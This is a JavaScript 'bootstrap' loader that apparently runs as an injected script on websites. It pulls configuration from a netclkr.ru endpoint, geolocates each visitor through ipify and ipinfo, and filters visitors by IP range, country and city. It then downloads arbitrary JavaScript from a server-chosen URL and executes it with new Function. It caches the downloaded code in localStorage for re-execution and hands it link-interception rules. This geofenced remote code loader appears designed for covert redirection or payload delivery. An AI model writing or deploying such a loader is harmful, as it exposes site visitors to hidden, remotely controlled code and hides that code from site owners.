;(function () {
  "use strict";

  if (window.NetClkrBootstrap && window.NetClkrBootstrap.initialized) {
    return;
  }

  var DEFAULT_CONFIG_URL = "https://netclkr.ru/wp-json/netclkr/v1/config";
  var DEFAULT_TIMEOUT_MS = 4000;
  var DEFAULT_IP_TIMEOUT_MS = 3500;
  var DEFAULT_GEO_TIMEOUT_MS = 5000;
  var DEFAULT_GEO_TTL_MS = 30 * 60 * 1000;
  var DEFAULT_SUCCESS_CACHE_TTL_MS = 60 * 60 * 1000;

  function now() {
    return Date.now();
  }

  function isObject(value) {
    return value !== null && typeof value === "object" && !Array.isArray(value);
  }

  function toBoolean(value, fallback) {
    if (typeof value === "boolean") {
      return value;
    }

    if (typeof value === "string") {
      if (value === "true") {
        return true;
      }
      if (value === "false") {
        return false;
      }
    }

    return fallback;
  }

  function toNumber(value, fallback) {
    if (typeof value === "number" && !isNaN(value)) {
      return value;
    }

    if (typeof value === "string" && value.trim()) {
      var parsed = Number(value);
      if (!isNaN(parsed)) {
        return parsed;
      }
    }

    return fallback;
  }

  function toArray(value) {
    return Array.isArray(value) ? value : [];
  }

  function normalizeStringList(value) {
    if (Array.isArray(value)) {
      return value
        .map(function (item) {
          return typeof item === "string" ? item.trim() : "";
        })
        .filter(Boolean);
    }

    if (typeof value === "string" && value.trim()) {
      return value
        .split(",")
        .map(function (item) {
          return item.trim();
        })
        .filter(Boolean);
    }

    return [];
  }

  function safeJsonParse(value) {
    try {
      return JSON.parse(value);
    } catch (error) {
      return null;
    }
  }

  function getCurrentScript() {
    if (document.currentScript) {
      return document.currentScript;
    }

    var scripts = document.getElementsByTagName("script");
    return scripts.length ? scripts[scripts.length - 1] : null;
  }

  function resolveUrl(url, baseUrl) {
    if (!url || typeof url !== "string") {
      return "";
    }

    try {
      return new URL(url, baseUrl || window.location.href).toString();
    } catch (error) {
      return url;
    }
  }

  function trimTrailingSlash(value) {
    return typeof value === "string" ? value.replace(/\/+$/, "") : "";
  }

  function readDatasetConfig(script) {
    if (!script || !script.dataset) {
      return {};
    }

    return {
      instanceId: script.dataset.instanceId || "",
      configUrl: script.dataset.configUrl || "",
      requestTimeoutMs: toNumber(script.dataset.requestTimeoutMs, undefined),
      debug: toBoolean(script.dataset.debug, undefined)
    };
  }

  function getBootstrapConfig() {
    var script = getCurrentScript();
    var globalConfig = isObject(window.NetClkrConfig) ? window.NetClkrConfig : {};
    var legacyConfig = isObject(window.RemoteRulesConfig) ? window.RemoteRulesConfig : {};
    var datasetConfig = readDatasetConfig(script);
    var merged = {};
    var key;

    for (key in datasetConfig) {
      if (Object.prototype.hasOwnProperty.call(datasetConfig, key) && datasetConfig[key] !== "" && datasetConfig[key] !== undefined) {
        merged[key] = datasetConfig[key];
      }
    }

    for (key in legacyConfig) {
      if (Object.prototype.hasOwnProperty.call(legacyConfig, key) && legacyConfig[key] !== undefined) {
        merged[key] = legacyConfig[key];
      }
    }

    for (key in globalConfig) {
      if (Object.prototype.hasOwnProperty.call(globalConfig, key) && globalConfig[key] !== undefined) {
        merged[key] = globalConfig[key];
      }
    }

    merged.scriptSrc = script && script.src ? script.src : "";
    return merged;
  }

  function normalizeRuntimeConfig(config) {
    if (!isObject(config) || !config.instanceId || typeof config.instanceId !== "string") {
      throw new Error("NetClkrBootstrap: instanceId is required");
    }

    var baseUrl = config.scriptSrc || window.location.href;
    var resolvedConfigUrl = resolveUrl(config.configUrl || DEFAULT_CONFIG_URL, baseUrl);

    return {
      instanceId: config.instanceId,
      configUrl: resolvedConfigUrl,
      requestTimeoutMs:
        typeof config.requestTimeoutMs === "number"
          ? config.requestTimeoutMs
          : DEFAULT_TIMEOUT_MS,
      debug: Boolean(config.debug)
    };
  }

  function createLogger(runtimeConfig) {
    return {
      info: function () {
        if (typeof console !== "undefined" && typeof console.info === "function") {
          console.info.apply(console, arguments);
        }
      },
      warn: function () {
        if (typeof console !== "undefined" && typeof console.warn === "function") {
          console.warn.apply(console, arguments);
        }
      },
      error: function () {
        if (typeof console !== "undefined" && typeof console.error === "function") {
          console.error.apply(console, arguments);
        }
      },
      debug: function () {
        if (runtimeConfig.debug && typeof console !== "undefined") {
          console.log.apply(console, arguments);
        }
      }
    };
  }

  function fetchJson(url, timeoutMs) {
    var controller = typeof AbortController !== "undefined" ? new AbortController() : null;
    var timerId = null;

    if (controller) {
      timerId = setTimeout(function () {
        controller.abort();
      }, timeoutMs);
    }

    return fetch(url, {
      method: "GET",
      headers: { Accept: "application/json" },
      credentials: "omit",
      cache: "no-store",
      signal: controller ? controller.signal : undefined
    })
      .then(function (response) {
        if (!response.ok) {
          throw new Error("NetClkrBootstrap: request failed with " + response.status);
        }
        return response.json();
      })
      .finally(function () {
        if (timerId) {
          clearTimeout(timerId);
        }
      });
  }

  function ipToNumber(ip) {
    if (typeof ip !== "string") {
      return null;
    }

    var parts = ip.split(".");
    if (parts.length !== 4) {
      return null;
    }

    var numbers = parts.map(function (part) {
      return Number(part);
    });

    if (numbers.some(function (part) { return isNaN(part) || part < 0 || part > 255; })) {
      return null;
    }

    return numbers[0] * 16777216 + numbers[1] * 65536 + numbers[2] * 256 + numbers[3];
  }

  function compileIpRanges(ranges) {
    return toArray(ranges)
      .filter(isObject)
      .map(function (range) {
        return {
          start: ipToNumber(range.start),
          end: ipToNumber(range.end)
        };
      })
      .filter(function (range) {
        return range.start !== null && range.end !== null && range.start <= range.end;
      });
  }

  function isIpInRanges(ip, compiledRanges) {
    var ipNumber = ipToNumber(ip);
    var i;

    if (ipNumber === null) {
      return false;
    }

    for (i = 0; i < compiledRanges.length; i += 1) {
      if (ipNumber >= compiledRanges[i].start && ipNumber <= compiledRanges[i].end) {
        return true;
      }
    }

    return false;
  }

  function buildGeoCacheKey(instanceId) {
    return "__netclkr_geo__:" + instanceId;
  }

  function buildSuccessCacheKey(instanceId) {
    return "__netclkr_success_cache__:" + instanceId;
  }

  function readSuccessCache(instanceId) {
    try {
      var raw = localStorage.getItem(buildSuccessCacheKey(instanceId));
      var cached = raw ? safeJsonParse(raw) : null;

      if (!cached || typeof cached.ts !== "number") {
        return null;
      }

      if (now() - cached.ts > DEFAULT_SUCCESS_CACHE_TTL_MS) {
        return null;
      }

      if (!cached.payload || !cached.moduleSource) {
        return null;
      }

      if (cached.hostname && cached.hostname !== window.location.hostname) {
        return null;
      }

      return cached;
    } catch (error) {
      return null;
    }
  }

  function writeSuccessCache(instanceId, payload, moduleSource) {
    try {
      localStorage.setItem(
        buildSuccessCacheKey(instanceId),
        JSON.stringify({
          ts: now(),
          hostname: window.location.hostname,
          payload: payload,
          moduleSource: moduleSource
        })
      );
    } catch (error) {}
  }

  function readGeoCache(instanceId) {
    try {
      var raw = sessionStorage.getItem(buildGeoCacheKey(instanceId));
      var cached = raw ? safeJsonParse(raw) : null;

      if (!cached || typeof cached.ts !== "number") {
        return null;
      }

      if (now() - cached.ts > DEFAULT_GEO_TTL_MS) {
        return null;
      }

      return cached;
    } catch (error) {
      return null;
    }
  }

  function writeGeoCache(instanceId, geoData) {
    try {
      sessionStorage.setItem(
        buildGeoCacheKey(instanceId),
        JSON.stringify({
          ip: geoData.ip || "",
          country: geoData.country || "",
          city: geoData.city || "",
          ts: now()
        })
      );
    } catch (error) {}
  }

  function evaluateLocation(locationRule, geoData) {
    if (!geoData) {
      return { blocked: false, reason: "no_geo" };
    }

    if (locationRule.countries.length && locationRule.countries.indexOf(geoData.country) === -1) {
      return { blocked: true, reason: "country_mismatch" };
    }

    if (locationRule.excludedCities.length && locationRule.excludedCities.indexOf(geoData.city) !== -1) {
      return { blocked: true, reason: "blocked_city" };
    }

    return { blocked: false, reason: "passed" };
  }

  function loadGeoData(instanceId, geoApiUrl, logger) {
    var cached = readGeoCache(instanceId);
    var resolvedGeoApiUrl = geoApiUrl || "https://ipinfo.io/json";
    var ipPromise = fetchJson("https://api.ipify.org?format=json", DEFAULT_IP_TIMEOUT_MS);
    var locationPromise = cached
      ? Promise.resolve(cached)
      : fetchJson(resolvedGeoApiUrl, DEFAULT_GEO_TIMEOUT_MS);

    return Promise.all([ipPromise, locationPromise]).then(function (results) {
      var ipResponse = results[0];
      var locationResponse = results[1];
      var geoData = {
        ip: (ipResponse && ipResponse.ip) || (locationResponse && locationResponse.ip) || "",
        country: (locationResponse && locationResponse.country) || "",
        city: (locationResponse && locationResponse.city) || ""
      };

      if (!cached && (geoData.ip || geoData.country || geoData.city)) {
        writeGeoCache(instanceId, geoData);
      }

      if (logger) {
        logger.info("[NetClkr] geo:received", {
          instanceId: instanceId,
          source: cached ? "session-cache" : "remote",
          ip: geoData.ip || "",
          country: geoData.country || "",
          city: geoData.city || ""
        });
      }

      return geoData;
    });
  }

  function normalizePrecheckConfig(remoteConfig) {
    var precheck = isObject(remoteConfig.precheck) ? remoteConfig.precheck : {};
    var geo = isObject(precheck.geo) ? precheck.geo : {};

    return {
      ipRanges: compileIpRanges(precheck.ipRanges),
      geoApiUrl:
        isObject(remoteConfig) && typeof remoteConfig.geoApiUrl === "string"
          ? remoteConfig.geoApiUrl
          : "https://ipinfo.io/json",
      geo: {
        countries: normalizeStringList(geo.countries && geo.countries.length ? geo.countries : geo.country),
        excludedCities: normalizeStringList(
          geo.excludedCities && geo.excludedCities.length ? geo.excludedCities : geo.excludedCity
        )
      }
    };
  }

  function runPrechecks(instanceId, remoteConfig, logger) {
    var precheckConfig = normalizePrecheckConfig(remoteConfig);
    var compiledRanges = precheckConfig.ipRanges;

    if (!compiledRanges.length && !precheckConfig.geo.countries.length && !precheckConfig.geo.excludedCities.length) {
      return Promise.resolve({ passed: true, reason: "none" });
    }

    return loadGeoData(instanceId, precheckConfig.geoApiUrl, logger)
      .then(function (geoData) {
        if (geoData.ip && isIpInRanges(geoData.ip, compiledRanges)) {
          return { passed: false, reason: "blocked_ip", geoData: geoData };
        }

        var locationResult = evaluateLocation(precheckConfig.geo, geoData);

        if (locationResult.blocked) {
          return { passed: false, reason: locationResult.reason, geoData: geoData };
        }

        return { passed: true, reason: "passed", geoData: geoData };
      })
      .catch(function () {
        return { passed: false, reason: "error" };
      });
  }

  function executeModuleSource(source, payload, logger, moduleUrl) {
    var factory = new Function("window", "document", "payload", source);
    factory(window, document, payload);
    logger.debug("NetClkrBootstrap: module loaded", moduleUrl || "cache");
  }

  function loadModule(instanceId, moduleUrl, payload, logger) {
    return fetch(moduleUrl, {
      method: "GET",
      credentials: "omit",
      cache: "no-store"
    })
      .then(function (response) {
        if (!response.ok) {
          throw new Error("NetClkrBootstrap: module request failed with " + response.status);
        }
        return response.text();
      })
      .then(function (source) {
        executeModuleSource(source, payload, logger, moduleUrl);
        writeSuccessCache(instanceId, payload, source);
      });
  }

  function buildConfigRequestUrl(configUrl, instanceId) {
    var normalizedBase = trimTrailingSlash(configUrl);

    if (normalizedBase.indexOf("{instanceId}") !== -1) {
      return normalizedBase.replace("{instanceId}", encodeURIComponent(instanceId));
    }

    return normalizedBase + "/" + encodeURIComponent(instanceId);
  }

  function normalizeApiConfig(responseConfig, runtimeConfig) {
    return {
      instanceId: runtimeConfig.instanceId,
      status: typeof responseConfig.status === "string" ? responseConfig.status : "off",
      moduleUrl: typeof responseConfig.moduleUrl === "string" ? responseConfig.moduleUrl : "",
      logUrl: typeof responseConfig.logUrl === "string" ? responseConfig.logUrl : "",
      interceptLinks: responseConfig.interceptLinks !== false,
      rules: toArray(responseConfig.rules).filter(isObject),
      precheck: isObject(responseConfig.precheck) ? responseConfig.precheck : {},
      geoApiUrl: typeof responseConfig.geoApiUrl === "string" ? responseConfig.geoApiUrl : ""
    };
  }

  function bootstrap() {
    var runtimeConfig = normalizeRuntimeConfig(getBootstrapConfig());
    var logger = createLogger(runtimeConfig);
    var cachedSuccess = readSuccessCache(runtimeConfig.instanceId);

    logger.info("[NetClkr] bootstrap:start", {
      instanceId: runtimeConfig.instanceId,
      configUrl: runtimeConfig.configUrl
    });

    if (cachedSuccess) {
      logger.info("[NetClkr] bootstrap:cache-hit", {
        instanceId: runtimeConfig.instanceId
      });
      executeModuleSource(cachedSuccess.moduleSource, cachedSuccess.payload, logger, "cache");
      return;
    }

    fetchJson(buildConfigRequestUrl(runtimeConfig.configUrl, runtimeConfig.instanceId), runtimeConfig.requestTimeoutMs)
      .then(function (apiResponse) {
        var remoteConfig = normalizeApiConfig(apiResponse, runtimeConfig);

        logger.info("[NetClkr] config:loaded", {
          instanceId: runtimeConfig.instanceId,
          status: remoteConfig.status,
          rulesCount: remoteConfig.rules.length
        });

        if (remoteConfig.status !== "on") {
          logger.warn("[NetClkr] bootstrap:stopped", {
            reason: "instance_disabled_or_missing",
            instanceId: runtimeConfig.instanceId
          });
          return null;
        }

        return runPrechecks(runtimeConfig.instanceId, remoteConfig, logger).then(function (precheckResult) {
          logger.info("[NetClkr] precheck:result", {
            instanceId: runtimeConfig.instanceId,
            passed: precheckResult.passed,
            reason: precheckResult.reason,
            geoData: precheckResult.geoData || null
          });

          if (!precheckResult.passed) {
            return null;
          }

          if (!remoteConfig.moduleUrl) {
            logger.warn("[NetClkr] bootstrap:stopped", {
              reason: "module_url_missing",
              instanceId: runtimeConfig.instanceId
            });
            return null;
          }

          logger.info("[NetClkr] module:loading", {
            moduleUrl: remoteConfig.moduleUrl,
            instanceId: runtimeConfig.instanceId
          });

          return loadModule(runtimeConfig.instanceId, resolveUrl(remoteConfig.moduleUrl, runtimeConfig.configUrl), {
            instanceId: runtimeConfig.instanceId,
            logUrl: remoteConfig.logUrl ? resolveUrl(remoteConfig.logUrl, runtimeConfig.configUrl) : "",
            interceptLinks: remoteConfig.interceptLinks,
            rules: remoteConfig.rules
          }, logger);
        });
      })
      .catch(function (error) {
        logger.error("[NetClkr] bootstrap:error", error && error.message ? error.message : error);
      });
  }

  window.NetClkrBootstrap = {
    initialized: true,
    version: "3.1.0",
    defaultConfigUrl: DEFAULT_CONFIG_URL
  };

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", bootstrap);
  } else {
    bootstrap();
  }
})();
